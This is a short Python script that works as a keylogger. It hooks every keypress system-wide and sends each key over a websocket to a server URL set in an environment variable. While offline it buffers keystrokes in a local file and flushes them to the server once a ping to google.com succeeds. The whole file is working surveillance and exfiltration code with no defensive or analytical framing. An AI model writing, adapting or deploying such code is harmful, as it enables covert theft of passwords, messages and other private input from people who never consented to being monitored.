import asyncio
from websockets import connect
from dotenv import load_dotenv
import os
import keyboard
import subprocess

load_dotenv()

websocket_url = os.getenv("WEBSOCKET_URL")

async def check_internet_connection():
    try:
        command = ["ping", "-c", "1", "google.com"] if os.name != "nt" else ["ping", "-n", "1", "google.com"]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        return result.returncode == 0
    except Exception as e:
        return False

async def send_data(data):
    async with connect(websocket_url) as websocket:
        await websocket.send(data)

async def on_key_event(event):
    key = event.name

    if await check_internet_connection():
        if os.path.exists(os.getenv("LOG_STORAGE_AREA")):
            with open(os.getenv("LOG_STORAGE_AREA"), "r") as file:
                content = file.read()
                if content:
                    await send_data(content)
                    with open(os.getenv("LOG_STORAGE_AREA"), "w") as file:
                        pass
        
        await send_data(key)
    else:
        with open(os.getenv("LOG_STORAGE_AREA"), "a") as file:
            file.write(key)

if __name__ == "__main__":
    keyboard.on_press(lambda event: asyncio.run(on_key_event(event)))
    keyboard.wait()
